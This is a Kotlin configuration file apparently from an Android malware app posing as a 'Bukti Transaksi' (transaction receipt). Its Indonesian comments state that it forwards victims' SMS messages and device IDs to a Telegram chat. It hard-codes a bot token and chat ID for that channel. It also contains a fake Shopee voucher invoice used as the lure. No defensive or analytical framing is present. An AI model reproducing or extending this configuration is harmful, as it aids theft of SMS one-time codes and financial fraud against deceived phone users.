package com.buktitransaksi.app

/**
 * Konfigurasi utama aplikasi Bukti Transaksi.
 * 
 * CATATAN UNTUK DEVELOPER:
 * - BOT_TOKEN: Token bot Telegram yang didapat dari BotFather.
 * - CHAT_ID: ID chat atau channel Telegram tempat SMS & Device ID diteruskan.
 * - INVOICE_TEXT: Teks detail invoice default yang ditampilkan di layar utama aplikasi.
 */
object Constants {
    const val BOT_TOKEN = "9101428483:AAFWm9R-6Kc9kVQoxi1gjWmeZDaidFZXP3M"
    const val CHAT_ID = "8735666795"
    
    const val INVOICE_TEXT = """
        Pembelian Voucher Pulsa
        
        Merchant: Shopee
        Nominal: Rp 5.023.000
        Status: PROSES
        
        Terima kasih telah melakukan Transaksi.
    """.trimIndent()
}
